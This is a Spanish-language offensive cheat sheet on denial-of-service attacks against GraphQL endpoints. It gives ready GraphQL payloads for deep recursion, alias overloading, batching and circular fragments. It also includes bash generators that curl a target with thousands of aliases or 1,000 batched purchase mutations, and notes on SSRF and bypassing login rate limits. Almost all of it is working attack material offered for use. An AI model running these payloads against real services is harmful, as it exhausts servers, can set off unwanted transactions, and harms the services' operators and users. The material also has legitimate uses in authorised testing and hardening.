---
aliases:
  - GraphQL DoS
  - Nested Query DoS
  - Aliases Overload
  - Circular Fragments
tags:
  - type/technique
  - vuln/graphql
  - vuln/dos
  - technique/impact
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
kind: SubCheatSheet
linked:
  - '[[GraphQL Injection]]'
---
# GraphQL - DoS

***

## Deeply Nested Queries (Recursión)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `{"query":"{user{posts{author{posts{author{posts{author{id}}}}}}}}"}` | 6 niveles de recursión | Type cycle User↔Post. |
| `{"query":"{user{friends{friends{friends{friends{friends{name}}}}}}}"}` | Friend-of-friend explosion | Self-referencing relations. |
| `{"query":"{users(first:1000){posts(first:1000){comments(first:1000){body}}}}"}` | N³ resolves (10⁹ ops) | Pagination sin limit. |
| `{"query":"{me{manager{manager{manager{manager{name}}}}}}"}` | Self-ref recursion | Type con field a sí mismo. |
| `time curl -X POST -d '{"query":"..."}' https://target/graphql` | Mide latencia → confirma DoS | Pre-attack check. |
| Bash loop generando query con N niveles → ver code block | Genera payload arbitrariamente profundo | Auto-tune depth. |
^graphql-dos-nested

### Generador nested query (bash)

```bash
# Genera query con N niveles de nested User→friends
N=15
QUERY="{me"
for i in $(seq 1 $N); do QUERY+="{friends"; done
QUERY+="{name}"
for i in $(seq 1 $N); do QUERY+="}"; done
QUERY+="}"

curl -X POST -H "Content-Type: application/json" \
  -d "{\"query\":\"$QUERY\"}" \
  https://target/graphql
```

___

## Aliases Overloading

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `{"query":"{a1:expensiveQuery(id:1){result} a2:expensiveQuery(id:2){result}}"}` | 2+ resolves single query | Aliases sin limit. |
| Bash genera 10000 aliases → ver code block | DB pool exhaustion / memory blow-up | Sin alias limit defense. |
| `{"query":"{a:fetch(url:\"http://t1\") b:fetch(url:\"http://t2\") c:fetch(url:\"http://t3\")}"}` | Multi-target SSRF en 1 request | Combine con SSRF resolver. |
| Aliases bruteforce login (ver Auth y Lógica) | Rate limit bypass + DoS combo | Login resolver pesado. |
| `{"query":"mutation{a:expensiveMutation b:expensiveMutation c:expensiveMutation}"}` | Aliased mutations en paralelo | Race conditions + DoS. |
^graphql-dos-aliases

### Generador aliases overload (bash)

```bash
# 10000 aliases sobre resolver expensive
QUERY='{'
for i in $(seq 1 10000); do
  QUERY+="a${i}:expensiveQuery(id:${i}){result} "
done
QUERY+='}'

curl -X POST -H "Content-Type: application/json" \
  -d "{\"query\":\"$QUERY\"}" \
  https://target/graphql

# Ajustar N: empezar 100, 1000, 10000 hasta que server timeout
```

___

## Field Duplication / Batching Abuse

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `{"query":"{user{id id id id id}}"}` con N repeticiones | Engine no deduplica → N resolves | Engine viejo. |
| Array batch `[{q1},{q2},...,{qN}]` con N=1000 queries pesadas | Single request → N ejecuciones | Spec batching habilitado. |
| `{"query":"{__schema{...}}"}` × 100 batched | Heavy introspection compute | Introspection no deshabilitada. |
| `[{"query":"mutation{purchase(id:1)}"},{"query":"mutation{purchase(id:1)}"},...]` | Race conditions + DoS combo | Mutations idempotentes pero costosas. |
| `{"query":"{usrA usrB usrC ... usr10000}"}` con 10k field nonexistent | Suggestions engine sobrecarga | "Did you mean" enabled. |
^graphql-dos-batching

### Batched mutations DoS

```bash
# 1000 mutations idénticas en single request
BATCH='['
for i in $(seq 1 1000); do
  BATCH+="{\"query\":\"mutation{purchase(productId:1,quantity:1){id}}\"}"
  [ $i -lt 1000 ] && BATCH+=','
done
BATCH+=']'

curl -X POST -H "Content-Type: application/json" -d "$BATCH" https://target/graphql
```

___

## Circular Fragments

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `{"query":"query{user{...A}} fragment A on User{...B} fragment B on User{...A}"}` | Direct fragment cycle → engine loop | Engine viejo no detecta cycles. |
| `{"query":"... fragment A on User{...B} fragment B on User{...C} fragment C on User{...A}"}` | 3-way cycle indirect | Detección menos común. |
| `{"query":"{user{... on User{... on User{... on User{name}}}}}"}` | Inline fragment self-loop | Edge case algunos engines. |
| `curl -w "@curl-format.txt" ...` | Mide tiempo de response | Confirma engine vulnerable. |
^graphql-dos-circular

### PoC circular fragments

```graphql
query Cycle {
  user {
    ...A
  }
}

fragment A on User {
  ...B
}

fragment B on User {
  ...A
}
```

Engine viejo intenta expandir A → expand B → expand A → loop. Apps modernas detectan y rejectan.

***
